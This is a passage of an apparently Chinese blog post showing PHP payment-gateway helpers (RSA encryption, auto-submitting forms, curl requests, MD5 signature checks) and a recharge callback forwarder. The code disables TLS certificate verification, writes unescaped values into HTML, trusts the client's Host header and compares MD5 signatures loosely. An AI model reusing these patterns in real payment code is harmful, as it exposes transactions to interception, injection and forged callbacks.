$public_key .=<span class=\"string\">\"-----END PUBLIC KEY-----\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $public_key;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">      * [publicEncrypt 公钥加密]</span></span><br><span class=\"line\"><span class=\"comment\">      * <span class=\"doctag\">@param</span>  [type] $publicKey 公钥</span></span><br><span class=\"line\"><span class=\"comment\">      * <span class=\"doctag\">@param</span>  [type] $data      加密字符串</span></span><br><span class=\"line\"><span class=\"comment\">      * <span class=\"doctag\">@return</span> [type]            [description]</span></span><br><span class=\"line\"><span class=\"comment\">      */</span></span><br><span class=\"line\">      <span class=\"keyword\">public</span>  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">publicEncrypt</span><span class=\"params\">($publicKey, $data)</span></span></span><br><span class=\"line\"><span class=\"function\">      </span>&#123;</span><br><span class=\"line\">        $key = openssl_get_publickey($publicKey);</span><br><span class=\"line\"></span><br><span class=\"line\">        $original_arr = str_split($data,<span class=\"number\">117</span>);</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span>($original_arr <span class=\"keyword\">as</span> $o) &#123;</span><br><span class=\"line\">            $sub_enc = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">            openssl_public_encrypt($o,$sub_enc,$key);</span><br><span class=\"line\">            $original_enc_arr[] = $sub_enc;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        openssl_free_key($key);</span><br><span class=\"line\">        $original_enc_str = base64_encode(implode(<span class=\"string\">''</span>,$original_enc_arr));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $original_enc_str;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * [paramToHtmlForm form表单方法]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $url    请求URL</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $params 数组 请求参数</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> [type]         [description]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span>  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">paramToHtmlForm</span><span class=\"params\">($url,$params)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $def_url = <span class=\"string\">\"&lt;form id='form' name='payForm' action='\"</span>.$url.<span class=\"string\">\"' method='POST'&gt;\\r\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($params <span class=\"keyword\">as</span> $key =&gt; $value) &#123;</span><br><span class=\"line\">            $def_url .=<span class=\"string\">\"&lt;input type='hidden' name='\"</span>.$key.<span class=\"string\">\"' value='\"</span>.$value.<span class=\"string\">\"'&gt;\\r\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $def_url .=<span class=\"string\">\"&lt;input type='submit' value='确认提交'&gt;&lt;/form&gt;&lt;script language='javascript'&gt;window.onload=function()&#123;document.payForm.submit();&#125;&lt;/script&gt;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $def_url;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * [httpRequest http请求]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $url  请求URL</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $data 请求参数 json字符串</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> [type]       [description]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span>  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">httpRequest</span><span class=\"params\">($url,$data)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $ch = curl_init();</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, <span class=\"string\">\"POST\"</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class=\"keyword\">FALSE</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class=\"keyword\">FALSE</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_USERAGENT, <span class=\"string\">'Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)'</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_HTTPHEADER, <span class=\"keyword\">array</span>(<span class=\"string\">'Content-Type: application/json'</span>,<span class=\"string\">'Content-Length: '</span> . strlen($data)));</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class=\"number\">1</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_AUTOREFERER, <span class=\"number\">1</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"keyword\">true</span>);</span><br><span class=\"line\">        $tmpInfo = curl_exec($ch);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (curl_errno($ch)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> curl_error($ch);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $tmpInfo;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     *[payVerify 支付付验签]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $result [返回的参数]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> [type] $md5    [MD5]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">payVerify</span><span class=\"params\">($result,$md5)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $signStr = $result[<span class=\"string\">'sign'</span>];</span><br><span class=\"line\">        $sign_array = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($result <span class=\"keyword\">as</span> $k =&gt; $v) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ($k !== <span class=\"string\">'sign'</span>)&#123;</span><br><span class=\"line\">                $sign_array[$k] = $v;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $sign  = md5(<span class=\"keyword\">$this</span>-&gt;get_sign($sign_array).$md5);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($signStr != $sign)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">CurlQuery</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//设置附加HTTP头</span></span><br><span class=\"line\">        $addHead = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">            <span class=\"string\">\"Content-type: application/json\"</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">        $curl_obj = curl_init();</span><br><span class=\"line\">        curl_setopt($curl_obj, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($curl_obj, CURLOPT_HTTPHEADER, $addHead);</span><br><span class=\"line\">        curl_setopt($curl_obj, CURLOPT_HEADER, <span class=\"number\">0</span>);</span><br><span class=\"line\">        curl_setopt($curl_obj, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">        curl_setopt($curl_obj, CURLOPT_TIMEOUT, <span class=\"number\">15</span>);</span><br><span class=\"line\">        $result = curl_exec($curl_obj);</span><br><span class=\"line\">        curl_close($curl_obj);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $result;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//根据长网址获取短网址</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">shortUrl</span><span class=\"params\">($long_url, $appkey)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $long_url = urlencode($long_url);</span><br><span class=\"line\">        $url = <span class=\"string\">'http://mrw.so/api.php?format=json&amp;url='</span> . $long_url . <span class=\"string\">'&amp;key='</span> . $appkey . <span class=\"string\">'&amp;expireDate='</span> . date(<span class=\"string\">\"Y-m-d\"</span>,strtotime(<span class=\"string\">\"+3 day\"</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//获取请求结果</span></span><br><span class=\"line\">        $result = <span class=\"keyword\">$this</span>-&gt;CurlQuery($url);</span><br><span class=\"line\">        $json = json_decode($result);</span><br><span class=\"line\">        <span class=\"comment\">//异常情况返回false</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($json-&gt;err) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $json-&gt;url;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 提交表单数据</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> array $post_data 表单提交数据</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> string $url 表单提交接口</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> string</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">httpHtml</span><span class=\"params\">($post_data, $url)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $html = <span class=\"string\">'&lt;html&gt;'</span>;</span><br><span class=\"line\">        $html = <span class=\"string\">'&lt;head&gt;'</span>;</span><br><span class=\"line\">        $html .= <span class=\"string\">'&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"&gt;'</span>;</span><br><span class=\"line\">        $html .= <span class=\"string\">'&lt;/head&gt;'</span>;</span><br><span class=\"line\">        $html .= <span class=\"string\">'&lt;body onLoad=\"document.dinpayForm.submit();\"&gt;'</span>;</span><br><span class=\"line\">        $html .= <span class=\"string\">'&lt;form id=\"payFrom\" name=\"dinpayForm\" method=\"get\" action=\"'</span> . $url . <span class=\"string\">'\"&gt;'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($post_data <span class=\"keyword\">as</span> $key =&gt; $value) &#123;</span><br><span class=\"line\">            $html .= <span class=\"string\">'&lt;input type=\"hidden\" name=\"'</span> . $key . <span class=\"string\">'\" value=\"'</span> . $value . <span class=\"string\">'\"/&gt;'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $html .= <span class=\"string\">'&lt;/form&gt;'</span>;</span><br><span class=\"line\">        $html .= <span class=\"string\">'&lt;/body&gt;'</span>;</span><br><span class=\"line\">        $html .= <span class=\"string\">'&lt;/html&gt;'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $html;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 调用第三方接口，提交数据</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> string $url 第三方接口url</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> array $postdata 提交数据</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> array[]|mixed[] 返回数据</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">httpPost</span><span class=\"params\">($data, $url, $path=<span class=\"string\">''</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $ch = curl_init();</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_POST, <span class=\"number\">1</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class=\"keyword\">true</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class=\"number\">1</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_CAINFO, $path);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_HEADER, <span class=\"number\">0</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_HTTPHEADER,<span class=\"keyword\">array</span>(<span class=\"string\">'Content-Type: application/json; charset=utf-8'</span>,<span class=\"string\">'Content-Length:'</span> . strlen($data)));</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        $response = curl_exec($ch);</span><br><span class=\"line\">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">array</span>(<span class=\"string\">'code'</span> =&gt; $httpCode, <span class=\"string\">'data'</span> =&gt; $response);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * [privateKeyStr 私钥钥字符串处理]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $privatekey [description]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> [type]             [description]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">privateKeyStr</span><span class=\"params\">($privatekey)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $private_key = <span class=\"string\">\"-----BEGIN PRIVATE KEY-----\\r\\n\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (str_split($privatekey,<span class=\"number\">64</span>) <span class=\"keyword\">as</span> $str)&#123;</span><br><span class=\"line\">            $private_key .= $str . <span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $private_key .=<span class=\"string\">\"-----END PRIVATE KEY-----\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $private_key;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * [decode 私钥解密]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $data       [待解密字符串]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $privateKey [私钥]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> [type]             [description]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">privateDecrypt</span><span class=\"params\">($data,$privateKey)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//读取秘钥</span></span><br><span class=\"line\">        $pr_key = openssl_pkey_get_private($privateKey);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($pr_key == <span class=\"keyword\">false</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"打开密钥出错\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $data = base64_decode($data);</span><br><span class=\"line\">        $crypto = <span class=\"string\">''</span>;</span><br><span class=\"line\">        <span class=\"comment\">//分段解密</span></span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (str_split($data, <span class=\"number\">128</span>) <span class=\"keyword\">as</span> $chunk) &#123;</span><br><span class=\"line\">            openssl_private_decrypt($chunk, $decryptData, $pr_key);</span><br><span class=\"line\">            $crypto .= $decryptData;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $crypto;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>rechargeNotify回调核心代码</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * desc: 处理线上支付无参数路由支付回调处理方法：通过url调用执行该文件，获取相关支付确认信息后，通过curl转发到带参数路由的api接口</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">define(<span class=\"string\">'S_ROOT'</span>, dirname(<span class=\"keyword\">__FILE__</span>) . DIRECTORY_SEPARATOR);</span><br><span class=\"line\"><span class=\"comment\">//require S_ROOT . 'core' . DIRECTORY_SEPARATOR . 'base.php';</span></span><br><span class=\"line\"></span><br><span class=\"line\">$data       = [];  <span class=\"comment\">//支付回调数据</span></span><br><span class=\"line\">$payData    = <span class=\"string\">''</span>;  <span class=\"comment\">//支付回传的支付参数，规定：使用\"_\"将支付名称与支付ID连接起来，如兄弟支付：'xiongdi_123'</span></span><br><span class=\"line\">$payType    = <span class=\"string\">''</span>;  <span class=\"comment\">//支付类型</span></span><br><span class=\"line\">$payment_id = <span class=\"string\">''</span>;  <span class=\"comment\">//支付方式ID</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不同的支付方式获取数据的方式可能不同，根据不同的支付，添加不同的获取回调数据的方法，如：$_GET\\$_POST\\$_REQUEST\\（php://input）</span></span><br><span class=\"line\">$postData = file_get_contents(<span class=\"string\">\"php://input\"</span>);  <span class=\"comment\">//获取post参数字符串类型数据</span></span><br><span class=\"line\">payLog(<span class=\"string\">'callbackRecharge.txt'</span>,print_r($postData,<span class=\"keyword\">true</span>).<span class=\"string\">'---23---'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//数据处理，不同的支付方式，可能数据处理方式不同</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>  (!<span class=\"keyword\">empty</span>($postData)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!simplexml_load_string($postData, <span class=\"string\">'SimpleXMLElement'</span>, LIBXML_NOCDATA)) &#123;</span><br><span class=\"line\">       parse_str($postData, $data);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        $data = json_decode(json_encode(simplexml_load_string($postData, <span class=\"string\">'SimpleXMLElement'</span>, LIBXML_NOCDATA)), <span class=\"keyword\">true</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    payLog(<span class=\"string\">'callbackRecharge.txt'</span>,print_r($postData,<span class=\"keyword\">true</span>).<span class=\"string\">'---20---'</span> . print_r(simplexml_load_string($postData, <span class=\"string\">'SimpleXMLElement'</span>, LIBXML_NOCDATA),<span class=\"keyword\">true</span>));</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    $data = $_REQUEST;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">payLog(<span class=\"string\">'callbackRecharge.txt'</span>,print_r($data,<span class=\"keyword\">true</span>).<span class=\"string\">'---26---'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($data)) &#123;</span><br><span class=\"line\">    payLog(<span class=\"string\">'callbackRecharge.txt'</span>, <span class=\"string\">'异步充值接参数通知数据：'</span> . print_r($data, <span class=\"keyword\">true</span>));  <span class=\"comment\">//日志，记录转接数据</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($data[<span class=\"string\">'pay_attach'</span>])) &#123;</span><br><span class=\"line\">        $payData = explode(<span class=\"string\">'_'</span>, $data[<span class=\"string\">'pay_attach'</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">empty</span>($payData)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">'0'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    $payType    = $payData[<span class=\"number\">0</span>] ?? <span class=\"string\">''</span>;</span><br><span class=\"line\">    $payment_id = $payData[<span class=\"number\">1</span>] ?? <span class=\"string\">''</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($data) &amp;&amp; !<span class=\"keyword\">empty</span>($payment_id)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    payLog(<span class=\"string\">'curlRecharge.log'</span>, <span class=\"string\">'异步充值url转接参数通知数据：'</span> . print_r($data, <span class=\"keyword\">true</span>));  <span class=\"comment\">//日志，记录转接数据</span></span><br><span class=\"line\"></span><br><span class=\"line\">    $ret = httpPostApi($data, $payment_id);   <span class=\"comment\">//异步充值通知转接</span></span><br><span class=\"line\">    payLog(<span class=\"string\">'callbackRecharge.txt'</span>,print_r($ret,<span class=\"keyword\">true</span>).<span class=\"string\">'----73--'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $ret;  <span class=\"comment\">//输出结果数据</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 充值异步转接接口调用，post数据转发，表单提交数据库格式</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> array $payData  需要转发的数据</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> int $paymentId  线上支付方式ID</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> mixed|number   返回数据</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">httpPostApi</span><span class=\"params\">($payData, $paymentId)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//路由api接口</span></span><br><span class=\"line\">    $payUrl = <span class=\"string\">\"https://\"</span>.$_SERVER[<span class=\"string\">'HTTP_HOST'</span>].<span class=\"string\">\"/?m=api&amp;c=recharge&amp;a=rechargeNotify&amp;payment_id=\"</span> . $paymentId;</span><br><span class=\"line\"></span><br><span class=\"line\">    $ch = curl_init();</span><br><span class=\"line\">    curl_setopt($ch,CURLOPT_URL, $payUrl);</span><br><span class=\"line\">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">    curl_setopt($ch, CURLOPT_POST, <span class=\"keyword\">true</span>);</span><br><span class=\"line\">    curl_setopt($ch, CURLOPT_HEADER, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payData));</span><br><span class=\"line\">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"keyword\">true</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $response=curl_exec($ch);</span><br><span class=\"line\">    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\"></span><br><span class=\"line\">    curl_close($ch);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($httpCode == <span class=\"number\">200</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $response;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 支付日志</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span>  string $fileName 文件名,如：payerror.log或者pay/error.log</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span>  array $data 数据</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">payLog</span><span class=\"params\">($fileName, $data)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $pathLog = S_ROOT . <span class=\"string\">'caches'</span> . DIRECTORY_SEPARATOR . <span class=\"string\">'log'</span> . 